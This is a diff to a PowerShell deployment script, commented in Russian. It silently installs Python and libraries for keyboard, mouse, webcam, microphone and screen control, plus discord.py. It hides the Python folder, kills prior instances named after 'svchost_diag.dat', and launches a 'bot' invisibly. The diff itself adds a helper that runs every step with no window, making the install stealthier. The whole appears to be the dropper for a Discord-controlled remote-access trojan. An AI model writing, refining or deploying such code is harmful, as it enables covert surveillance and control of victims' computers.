@@ -4,16 +4,47 @@ $ProgressPreference = 'SilentlyContinue'
 $logPath = "$env:TEMP\deploy.log"
 function Log($msg) { "[$(Get-Date -Format 'HH:mm:ss')] $msg" | Out-File -Append -Encoding utf8 $logPath }
 
+# Запуск процессов без создания консольного окна (Win32 CREATE_NO_WINDOW 0x08000000)
+function Run-Silent($exe, $cmdArgs, $wait = $true) {
+    try {
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = $exe
+        $psi.Arguments = $cmdArgs
+        $psi.CreateNoWindow = $true
+        $psi.UseShellExecute = $false
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $proc = [System.Diagnostics.Process]::Start($psi)
+        if ($wait -and $proc) {
+            $proc.WaitForExit()
+        }
+        return $proc
+    } catch {
+        Log "Run-Silent error: $_"
+        return $null
+    }
+}
+
 Log "=== deploy start ==="
 
 $pyPath = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
 $pyw    = "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"
 
+# Проверка существующего Python в системе
+if (-not (Test-Path $pyPath)) {
+    $cmdPy = Get-Command python.exe -ErrorAction SilentlyContinue
+    if ($cmdPy) {
+        $pyPath = $cmdPy.Source
+        $candPyw = Join-Path (Split-Path $pyPath) "pythonw.exe"
+        if (Test-Path $candPyw) { $pyw = $candPyw } else { $pyw = $pyPath }
+        Log "Found existing system Python: $pyPath"
+    }
+}
+
 if (-not (Test-Path $pyPath)) {
     Log "Installing Python 3.11..."
     $wc = New-Object Net.WebClient
     $wc.DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", "$env:TEMP\py_setup.exe")
-    Start-Process -FilePath "$env:TEMP\py_setup.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" -Wait
+    Run-Silent "$env:TEMP\py_setup.exe" "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" $true
     Remove-Item "$env:TEMP\py_setup.exe" -Force -ErrorAction SilentlyContinue
 
     $junkFolder = "$env:USERPROFILE\Desktop\параметры"
@@ -30,14 +61,20 @@ if (-not (Test-Path $pyPath)) {
     Log "Python installed: $pyPath"
 }
 
+# Гарантируем абсолютный путь к pythonw.exe
+if (-not (Test-Path $pyw)) {
+    $candPyw = Join-Path (Split-Path $pyPath) "pythonw.exe"
+    if (Test-Path $candPyw) { $pyw = $candPyw } else { $pyw = "pythonw.exe" }
+}
+
 $deps = @(
     "discord.py", "keyboard", "mouse", "psutil", "pyttsx3",
     "requests", "pywin32", "pycryptodome", "Pillow", "comtypes",
     "pycaw", "opencv-python", "pyaudio", "PyNaCl", "davey"
 )
 Log "Installing deps..."
-& $pyPath -m pip install --upgrade pip -q 2>&1 | Out-Null
-& $pyPath -m pip install @deps -q 2>&1 | Out-Null
+Run-Silent $pyPath "-m pip install --upgrade pip -q" $true
+Run-Silent $pyPath ("-m pip install " + ($deps -join " ") + " -q") $true
 Log "Deps done"
 
 # Скрыть каталог Python
@@ -80,8 +117,8 @@ Get-CimInstance Win32_Process | Where-Object {
     $_.Name -like "python*.exe" -and ($_.CommandLine -like "*svchost_diag.dat*" -or $_.CommandLine -like "*DOTA*")
 } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
 
-# Запуск через pythonw.exe
+# Запуск через pythonw.exe без создания консоли
 $args = "-W ignore -c `"exec(open(r'$botPath', encoding='utf-8').read())`""
-Start-Process -FilePath $pyw -ArgumentList $args -WindowStyle Hidden
+Run-Silent $pyw $args $false
 Log "Bot launched via pythonw.exe from $botPath"
 Log "=== deploy done ==="
